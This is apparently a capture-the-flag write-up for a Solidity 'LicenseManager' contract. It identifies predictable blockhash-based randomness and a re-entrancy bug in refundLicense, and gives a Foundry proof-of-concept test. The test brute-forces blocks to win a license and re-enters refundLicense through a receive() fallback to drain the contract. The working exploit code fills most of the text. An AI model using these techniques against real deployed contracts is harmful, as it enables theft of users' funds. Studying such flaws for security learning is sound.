# Analysis
Two vunerabilities in the contract:
1. It should use Oracles instead of using builtin functions like `blockhash` for the randomization, it can be predicted. An attacker can simulate the algorithm, wait for the right block to `winLicense()`.

2. Re-entrancy bug in the function `refundlicense()`. Attacker can drain all the balance.

# POC
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/LicenseManager.sol";

/** 
 * @title Test contract for LicenseManager
 */
contract LicenseManagerTest is Test {

	LicenseManager license;

	address owner = makeAddr("owner");
	address user1 = makeAddr("user1");
	address user2 = makeAddr("user2");
	address user3 = makeAddr("user3");
	address user4 = makeAddr("user4");

	address attacker = makeAddr("attacker");

	function setUp() public {
		vm.prank(owner);
		license = new LicenseManager();

		vm.deal(user1, 1 ether);
		vm.deal(user2, 1 ether);
		vm.deal(user3, 1 ether);
		vm.deal(user4, 1 ether);

		vm.prank(user1);
		license.buyLicense{value: 1 ether}();

		vm.prank(user2);
		license.buyLicense{value: 1 ether}();

		vm.prank(user3);
		license.buyLicense{value: 1 ether}();

		vm.prank(user4);
		license.buyLicense{value: 1 ether}();

	}

	function test_exploit1_2() public {
		vm.deal(attacker, 0.01 ether);
		vm.startPrank(attacker);
		//Challenge 1 solution
		{
			// try to find the right block within the next 1000 blocks
			for(uint i; i<1000; i++) {

				uint algorithm = uint(keccak256(abi.encodePacked(uint(0.01 ether), attacker, uint(1337), blockhash(block.number - 1))));
				if (algorithm % 100 == 0) {
					license.winLicense{value: 0.01 ether}();
					break;
				}
				vm.roll(block.number + 1); // try the next block
			}
		}

		assertEq(true, license.checkLicense());
		vm.stopPrank();

		vm.startPrank(attacker);
		//Challenge 2.1 solution
		{
			license.refundLicense();
		}

		assertGt(attacker.balance, 0.1 ether);
		vm.stopPrank();

	}

	// This is re-entered, until it's all drained
	receive() external payable {
		if(address(license).balance >= 1 ether) {
			license.refundLicense();
		}
	} 
	/// collect the ethers in the contract before the owner notices in second way.
	function test_exploit3() public {
		vm.deal(address(this), 1 ether);
		// challenge 2.2 solution
		{
			license.buyLicense{value: 1 ether}();
			license.refundLicense();
		}

		console.log("\tFinal Balance\t", address(this).balance);
		assertGt(address(this).balance, 1 ether);
	}
}

```




